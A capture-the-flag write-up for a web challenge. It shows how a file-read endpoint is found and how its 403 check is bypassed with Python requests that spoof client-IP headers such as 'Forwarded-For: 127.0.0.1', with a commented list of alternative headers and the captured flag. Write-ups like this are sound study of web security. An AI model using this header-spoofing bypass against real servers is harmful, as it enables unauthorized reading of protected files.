# Web Exploitation

## README

Read me if you can!!

N:B: There is no need to do bruteforce.

Target : http://66.228.53.87:8989/

---

### Solution

The website asks to enter anything to read.

```javascript
<script>
    document.querySelector('form').addEventListener('submit', async function (e) {
        e.preventDefault();
        const url = document.getElementById('file').value;
        const response = await fetch(`/fetch?file=${encodeURIComponent(url)}`);
        const result = await response.json();
        
        // Display the result with a different background
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = `<div class="alert alert-info" role="alert">${result.result}</div>`;
    });
</script>
```

Our input will takes as `file` argument and fetch it.

```python
import requests

file = input('Enter file to read: ')

req = requests.get(f'http://66.228.53.87:8989/fetch?file={file}')
print(req.text)

"""
<-- Result -->
Enter file to read: text.txt
{"result":"Yes! You can read files! Dont ask for hint its ezz!!"}

Enter file to read: flag.txt
{"result":"403 Access Denied"}
"""
```

So, we should bypass the 403. I found [this site](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses).

Final payload:

```python
import requests

headers = {
    'Forwarded-For': '127.0.0.1'

    # 'X-Originating-IP': '127.0.0.1',
    # 'X-Forwarded-For': '127.0.0.1',
    # 'X-Forwarded': '127.0.0.1',
    # 'Forwarded-For': '127.0.0.1',
    # 'X-Remote-IP': '127.0.0.1',
    # 'X-Remote-Addr': '127.0.0.1',
    # 'X-ProxyUser-Ip': '127.0.0.1',
    # 'X-Original-URL': '127.0.0.1',
    # 'Client-IP': '127.0.0.1',
    # 'True-Client-IP': '127.0.0.1',
    # 'Cluster-Client-IP': '127.0.0.1',
    # 'X-ProxyUser-Ip': '127.0.0.1',
    # 'Host': 'localhost'
    # or activate all header above
}

req = requests.get(f'http://66.228.53.87:8989/fetch?file=flag.txt', headers=headers)
print(req.text)

# {"result":"KCTF{kud05w3lld0n3!}"}
```

### KCTF{kud05w3lld0n3!}